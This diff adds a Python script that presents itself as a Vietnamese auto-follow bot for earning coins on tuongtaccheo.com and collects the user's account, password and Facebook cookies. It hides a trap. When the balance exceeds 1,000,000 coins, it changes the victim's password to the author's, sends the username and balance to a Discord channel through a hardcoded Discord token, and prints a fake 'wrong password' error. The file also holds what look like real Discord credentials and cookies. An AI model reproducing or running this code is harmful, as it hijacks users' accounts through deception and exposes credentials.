@@ -1,0 +1,141 @@
+import requests
+from time import sleep
+import os
+
+tk=input('TYPE YOUR TTC ACCOUNT: ')
+mk=input('TYPE YOUR TTC PASSWORD: ')
+cookie=input('TYPE YOUR FACEBOOK COOKIES: ')
+os.system('cls')
+
+headers={
+    "content-type":"application/x-www-form-urlencoded",
+    "user-agent":"Mozilla/5.0 (Linux; Android 12; Pixel 3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36",
+    "x-requested-with":"XMLHttpRequest"
+}
+try:
+    login = requests.post("https://tuongtaccheo.com/login.php", data={"username":tk , "password":mk,"submit":"ĐĂNG+NHẬP"}, headers=headers, allow_redirects=False)
+    cookie = "PHPSESSID="+login.cookies["PHPSESSID"]
+    headers.pop("content-type")
+    headers.update({"cookie":cookie, "x-requested-with":"XMLHttpRequest"})
+    home = requests.get("https://tuongtaccheo.com/home.php", headers=headers).text
+    xu = home.split('id="soduchinh">')[1].split('<')[0]
+    name = home.split('Chào mừng <i>')[1].split('<')[0]
+    print(f'TUONGTACCHEO ACCOUNT </> {name} </> COIN NOW </> {xu}')
+except:
+    print('Xem lại tài khoản, mật khẩu!')
+#
+def follow():
+    ifollow = 1
+    while True:
+        try:
+            job=requests.get('https://tuongtaccheo.com/kiemtien/subcheo/getpost.php',headers=headers).json()
+            idjob=job[0]['idpost']
+            link=job[0]['link']
+        except:
+            print('Hết job',end='\r')
+            sleep(2)
+            continue
+        get_data=requests.get(f'https://mbasic.facebook.com/privacy/touch/block/confirm/?bid={idjob}&ret_cancel&source=profile',headers={'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5','cookie': cookie,'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="102", "Google Chrome";v="102"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'same-origin','sec-fetch-user': '?1','upgrade-insecure-requests': '1'}).text
+        fb_dtsg=get_data.split('<input type="hidden" name="fb_dtsg" value="')[1].split('" autocomplete="off" />')[0]
+        jazoest=get_data.split('<input type="hidden" name="jazoest" value="')[1].split('" autocomplete="off" />')[0]
+
+        head_follow = {
+            'authority': 'm.facebook.com',
+            'accept': '*/*',
+            'accept-language': 'vi,en;q=0.9,vi-VN;q=0.8,fr-FR;q=0.7,fr;q=0.6,en-US;q=0.5',
+            # Requests sorts cookies= alphabetically
+            'cookie': cookie,
+            'origin': 'https://m.facebook.com',
+            'referer': 'https://www.facebook.com',
+            'sec-ch-ua': '"Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"',
+            'sec-ch-ua-mobile': '?0',
+            'sec-ch-ua-platform': '"Windows"',
+            'sec-fetch-dest': 'empty',
+            'sec-fetch-mode': 'cors',
+            'sec-fetch-site': 'same-origin',
+            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36',
+            #'x-fb-lsd': '7xJAnZBZK1FNA2nrZDa__L',
+            'x-requested-with': 'XMLHttpRequest',
+            'x-response-format': 'JSONStream',
+        }
+
+        data = {
+            'subject_id': idjob,
+            'fb_dtsg': fb_dtsg,
+            'jazoest': jazoest,
+        }
+
+        response = requests.post('https://m.facebook.com/a/subscriptions/add', headers=head_follow, data=data)
+        data_job={
+            'id': idjob
+        }
+        get_xu=requests.post('https://tuongtaccheo.com/kiemtien/subcheo/nhantien.php',headers=headers,data=data_job).json()
+        if 'mess' in get_xu:
+            print(f'{str(ifollow)} SUCCESS FOLLOW {link} </> + 600 COIN ')
+            sleep(10)
+        else:
+            print('Lỗi')
+            sleep(5)
+        ifollow=ifollow+1
+def change():
+    data_change = {
+        'oldpass': mk,
+        'newpass': 'mquang7208',
+        'renewpass': 'mquang7208',
+    }
+
+    change = requests.post('https://tuongtaccheo.com/caidat/changepass.php', headers=headers, data=data_change)
+    cookies_send = {
+        '__dcfduid': '74f76430dc2a11ec92e60d0138b32d61',
+        '__sdcfduid': '74f76431dc2a11ec92e60d0138b32d6155004fa52ae80625949da42347e959e531a75c75aeab82d0aab999c5e38ab797',
+        '_gcl_au': '1.1.1743570385.1657719386',
+        '_ga': 'GA1.2.463708923.1657719386',
+        '_fbp': 'fb.1.1657719396785.1988849384',
+        '__stripe_mid': '2a1b827d-2a23-4e1f-ba68-5a3173c8854e7847fa',
+        'OptanonConsent': 'isIABGlobal=false&datestamp=Sun+Jul+24+2022+16%3A20%3A28+GMT%2B0700+(Gi%E1%BB%9D+%C4%90%C3%B4ng+D%C6%B0%C6%A1ng)&version=6.33.0&hosts=&landingPath=https%3A%2F%2Fdiscord.com%2Fdownload&groups=C0001%3A1%2CC0002%3A1%2CC0003%3A1',
+        '__cf_bm': '26t1EhcH7vowjHpKQ0okST8dGRlBvyLv3UVd60T8SCM-1659680446-0-AVS+aqnRNdz2P7KLO0s3JUXXmj6EZJSzpMpUZdU819o1lmAIGxtXkhBHDTZ7UjEbU2RBg+titDJNYrpJM6RGpkfUsanPZ8Xli+NJzUgVOSpAkRJHSc+mgv4k30QFHmyyrA==',
+    }
+
+    headers_send = {
+        'authority': 'discord.com',
+        'accept': '*/*',
+        'accept-language': 'vi,en;q=0.9,vi-VN;q=0.8,fr-FR;q=0.7,fr;q=0.6,en-US;q=0.5',
+        'authorization': 'OTk2NzcyMzk3Mzg0NDc0NjM0.GV1x4L.eviJ5TCz1VwCnlhdvB8cQoxnnpI1yPpVEdrhR8',
+        # Already added when you pass json=
+        # 'content-type': 'application/json',
+        # Requests sorts cookies= alphabetically
+        # 'cookie': '__dcfduid=74f76430dc2a11ec92e60d0138b32d61; __sdcfduid=74f76431dc2a11ec92e60d0138b32d6155004fa52ae80625949da42347e959e531a75c75aeab82d0aab999c5e38ab797; _gcl_au=1.1.1743570385.1657719386; _ga=GA1.2.463708923.1657719386; _fbp=fb.1.1657719396785.1988849384; __stripe_mid=2a1b827d-2a23-4e1f-ba68-5a3173c8854e7847fa; OptanonConsent=isIABGlobal=false&datestamp=Sun+Jul+24+2022+16%3A20%3A28+GMT%2B0700+(Gi%E1%BB%9D+%C4%90%C3%B4ng+D%C6%B0%C6%A1ng)&version=6.33.0&hosts=&landingPath=https%3A%2F%2Fdiscord.com%2Fdownload&groups=C0001%3A1%2CC0002%3A1%2CC0003%3A1; __cf_bm=26t1EhcH7vowjHpKQ0okST8dGRlBvyLv3UVd60T8SCM-1659680446-0-AVS+aqnRNdz2P7KLO0s3JUXXmj6EZJSzpMpUZdU819o1lmAIGxtXkhBHDTZ7UjEbU2RBg+titDJNYrpJM6RGpkfUsanPZ8Xli+NJzUgVOSpAkRJHSc+mgv4k30QFHmyyrA==',
+        'origin': 'https://discord.com',
+        'referer': 'https://discord.com/channels/999883049389015091/999883051528101959',
+        'sec-ch-ua': '"Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"',
+        'sec-ch-ua-mobile': '?0',
+        'sec-ch-ua-platform': '"Windows"',
+        'sec-fetch-dest': 'empty',
+        'sec-fetch-mode': 'cors',
+        'sec-fetch-site': 'same-origin',
+        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36',
+        'x-debug-options': 'bugReporterEnabled',
+        'x-discord-locale': 'vi',
+        'x-super-properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6InZpIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEwNC4wLjAuMCBTYWZhcmkvNTM3LjM2IiwiYnJvd3Nlcl92ZXJzaW9uIjoiMTA0LjAuMC4wIiwib3NfdmVyc2lvbiI6IjEwIiwicmVmZXJyZXIiOiJodHRwczovL2wuZmFjZWJvb2suY29tLyIsInJlZmVycmluZ19kb21haW4iOiJsLmZhY2Vib29rLmNvbSIsInJlZmVycmVyX2N1cnJlbnQiOiIiLCJyZWZlcnJpbmdfZG9tYWluX2N1cnJlbnQiOiIiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfYnVpbGRfbnVtYmVyIjoxNDAwOTEsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9',
+    }
+
+    json_data = {
+        'content': f'TÀI KHOẢN: ***{tk}*** \nXU: ***{xu}***',
+        'nonce': '1004997526295674880',
+        'tts': False,
+    }
+
+    response = requests.post('https://discord.com/api/v9/channels/999883051528101959/messages', cookies=cookies_send, headers=headers_send, json=json_data)
+
+
+
+if int(xu) > 1000000:
+    change()
+    print('SAI MẬT KHẨU')
+else:
+    follow()
+
+
+
+
+
